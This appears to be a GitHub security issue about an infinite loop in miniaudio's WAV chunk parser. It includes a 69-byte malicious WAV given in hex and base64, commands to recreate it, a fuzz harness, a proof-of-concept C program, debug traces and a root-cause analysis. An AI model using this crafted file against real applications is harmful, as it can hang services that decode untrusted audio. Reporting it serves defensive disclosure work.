@@ -1,0 +1,185 @@
+#1151 Infinite loop in ma_dr_wav_init__internal from a 69-byte WAV with a forged chunk size | open | None | 2026-08-22T17:18:28Z
+https://github.com/mackron/miniaudio/issues/1151
+Posting here as per SECURITY.MD
+
+1. Summary
+	An attacker can provide a 69-byte WAV file with a forged size inside of the chunk header. Since the data is trusted and not checked, the parser skips forward by this declared size,
+	landing past the end of the file. This causes a continuous loop that must be killed by the user. [Ctrl-C]
+
+
+2. Version tested
+
+	miniaudio 0.11.25
+	Commit 9634bedb5b5a2ca38c1ee7108a9358a4e233f14d (2026-03-04)
+	Linux kali 6.19.14+kali-amd64 x86_64
+	Debian clang version 21.1.8 (7+b3)
+
+
+3. Reproduction
+
+
+Hex dump of file:
+	command: xxd -p crashes/timeout-c11ebd79368296f8b3b889c627e8ec565973dcd9 | tr -d '\n'
+	 output: 524946462477010057415645666d7420ffffffffffff08001000000001004700000000002700000200010010206461746100565656562fffffff6f2d008058adffa6600400                                                                                                                                                                                                         
+	 create: printf '524946462477010057415645666d7420ffffffffffff08001000000001004700000000002700000200010010206461746100565656562fffffff6f2d008058adffa6600400' | xxd -r -p > evil.wav
+	 
+	 
+base64 of file:
+	command: base64 -w0 crashes/timeout-c11ebd79368296f8b3b889c627e8ec565973dcd9 
+	 output: UklGRiR3AQBXQVZFZm10IP///////wgAEAAAAAEARwAAAAAAJwAAAgABABAgZGF0YQBWVlZWL////28tAIBYrf+mYAQA                                                                                                                                                                                                         
+	 create: echo 'UklGRiR3AQBXQVZFZm10IP///////wgAEAAAAAEARwAAAAAAJwAAAgABABAgZGF0YQBWVlZWL////28tAIBYrf+mYAQA' | base64 -d > evil.wav
+
+Verify:
+	sha1sum evil.wav
+	c11ebd79368296f8b3b889c627e8ec565973dcd9
+	
+Harness:
+	#define MINIAUDIO_IMPLEMENTATION
+	#include "miniaudio.h"
+	int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
+	{
+		ma_uint64 pFrameCountOut;
+		void* ppPCMFramesOut = NULL;
+		ma_result fuzz_mem = ma_decode_memory((const void*)data, size, NULL, &pFrameCountOut, &ppPCMFramesOut);
+		if (ppPCMFramesOut) ma_free(ppPCMFramesOut, NULL);
+	return 0;
+	}
+	
+Build command:
+	clang -g -O1 -fsanitize=address,fuzzer -fno-omit-frame-pointer -I . -o fuzz_ma fuzz_ma.c 
+	*Note: miniaudio.h must be present in the same folder as the harness when compiling.
+	
+Run:
+	./fuzz_ma evil.wav
+	
+	*Expected: hangs indefinitely. Kill with CTRL-C.
+	
+	When the source is compiled normally without the harness, and ran against the evil.wav file, it causes an indefinite loop that must be killed with CTRL-C
+	This rules out fuzzer artifacts.
+
+PoC.c:
+	#define MINIAUDIO_IMPLEMENTATION
+	#include <stdlib.h>
+	#include "miniaudio.h"
+	int main(int argc, char** argv)
+	{
+	//Open the file
+	FILE* f = fopen(argv[1], "rb");
+	fseek(f, 0, SEEK_END);
+	long size;
+	size = ftell(f);
+	fseek(f, 0, SEEK_SET); //back at beginning of file
+	char *inbuf = malloc(size);
+	fread(inbuf, 1, size, f);
+	fclose(f);
+
+	ma_uint64 pFrameCountOut;
+	void* ppPCMFramesOut = NULL;
+	ma_result fuzz_mem = ma_decode_memory((char *)inbuf, size, NULL, &pFrameCountOut, &ppPCMFramesOut);
+	if (ppPCMFramesOut) ma_free(ppPCMFramesOut, NULL);
+	return 0;
+	}
+
+Compile without ASan and UBsan:
+	clang -g -O1 -I . -o poc poc.c -lm
+              
+Confirming sha1sum matches:                                                                                                                                                                                           
+	sha1sum evil.wav
+	c11ebd79368296f8b3b889c627e8ec565973dcd9
+                                        
+Run:                                                                                                                                                                 
+	./poc evil.wav      
+	*Expect indefinite hang, user must CTRL-C
+	
+	
+4. What Happens:
+
+	To find out what size was being written to the chunk, I created a simple c file that prints out the specific
+	values when the loop passes:
+	
+	fuzz_ma_debug.c:
+		#define MINIAUDIO_IMPLEMENTATION
+		#include "miniaudio_debug.h" //modified h file with print statements.
+
+		int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
+		{
+		ma_uint64 pFrameCountOut;
+		void* ppPCMFramesOut = NULL;
+		ma_result fuzz_mem = ma_decode_memory((const void*)data, size, NULL, &pFrameCountOut, &ppPCMFramesOut);
+
+		if (ppPCMFramesOut) ma_free(ppPCMFramesOut, NULL);
+
+		return 0;
+		}
+	
+	miniaudio_debug.h:
+	                   81349:result = ma_dr_wav__read_chunk_header(pWav->onRead, pWav->pUserData, pWav->container, &cursor, &header);
+Added this line to print: +81350:fprintf(stderr, "PASS cursor=%llu size=%llu padding=%u\n", (unsigned long long)cursor, (unsigned long long)header.sizeInBytes, (unsigned int)header.paddingSize);
+	
+Compile debug fuzzer:
+	 clang -g -O1  -fsanitize=address,fuzzer -fno-omit-frame-pointer -I . -o fuzz_ma_debug fuzz_ma_debug.c
+	 
+Check sha1sum:
+	sha1sum  evil.wav
+	c11ebd79368296f8b3b889c627e8ec565973dcd9  evil.wav
+	
+Run Debug:
+	./fuzz_ma_debug 'evil.wav' 2>&1 | head -20
+	INFO: Running with entropic power schedule (0xFF, 100).
+	INFO: Seed: 4240050160
+	INFO: Loaded 1 modules   (23404 inline 8-bit counters): 23404 [0x559750d814d8, 0x559750d87044), 
+	INFO: Loaded 1 PC tables (23404 PCs): 23404 [0x559750d87048,0x559750de2708), 
+	./fuzz_ma_debug: Running 1 inputs 1 time(s) each.
+	Running: evil.wav
+	PASS cursor=20 size=4294967295 padding=1
+	PASS cursor=20 size=4294967295 padding=1
+	PASS cursor=4294967324 size=4294967295 padding=1
+	PASS cursor=8589934628 size=4294967295 padding=1
+	PASS cursor=12884901932 size=4294967295 padding=1
+	PASS cursor=17179869236 size=4294967295 padding=1
+	PASS cursor=21474836540 size=4294967295 padding=1
+	PASS cursor=25769803844 size=4294967295 padding=1
+	PASS cursor=30064771148 size=4294967295 padding=1
+	PASS cursor=34359738452 size=4294967295 padding=1
+	PASS cursor=38654705756 size=4294967295 padding=1
+	PASS cursor=42949673060 size=4294967295 padding=1
+	PASS cursor=47244640364 size=4294967295 padding=1
+	PASS cursor=51539607668 size=4294967295 padding=1
+	
+	The output shows us that the chunk's size is being set at 4294967295 bytes. Each pass of cursor advances it by 
+	4294967304 bytes from a 69-byte file.
+
+5. The cause:
+
+	In the function:
+		         81197:MA_PRIVATE ma_bool32 ma_dr_wav_init__internal(ma_dr_wav* pWav, ma_dr_wav_chunk_proc onChunk, void* pChunkUserData, ma_uint32 flags)
+	    		81346:for (;;) 
+	    		81349:result = ma_dr_wav__read_chunk_header(pWav->onRead, pWav->pUserData, pWav->container, &cursor, &header);
+	    			a. loop reads a chunk header
+				b. skips forward by header.sizeInBytes, which is never checked against the data available
+				c. read_chunk_header continues to return MA_SUCCESS even after the position has
+				   reached the end of the buffer, so the break at 81351 never fires. I did not
+				   determine why it keeps succeeding.
+				 	
+6. Suggested Fix
+
+	Chunk sizes are read from the file and never validated against the data available, the parser can't know the total size because it reads through callbacks, 
+	and the loop has no way to detect that a pass consumed nothing. A fix depends on where you want the callback contract to work.
+	
+	I also added some debug statements and noticed that ma_dr_wav_init__internal is called twice:
+	
+	└─$ ./PoC_Debug evil.wav 2>&1 | head -30
+		DEBUG1: BEFORE FOR TOP cursor=12
+		DEBUG2: AFTER RESULT TOP cursor=20
+		DEBUG1: BEFORE FOR TOP cursor=12
+		DEBUG2: AFTER RESULT TOP cursor=20
+		
+   DEBUG1: fprintf(stderr, "BEFORE FOR TOP cursor=%llu\n", (unsigned long long)cursor);
+   [81346] for (;;) {
+        ma_dr_wav_chunk_header header;
+        ma_uint64 chunkSize;
+        result = ma_dr_wav__read_chunk_header(pWav->onRead, pWav->pUserData, pWav->container, &cursor, &header);
+   DEBUG2: fprintf(stderr, "AFTER RESULT TOP cursor=%llu\n", (unsigned long long)cursor);
+
+Cheers,
+dutch
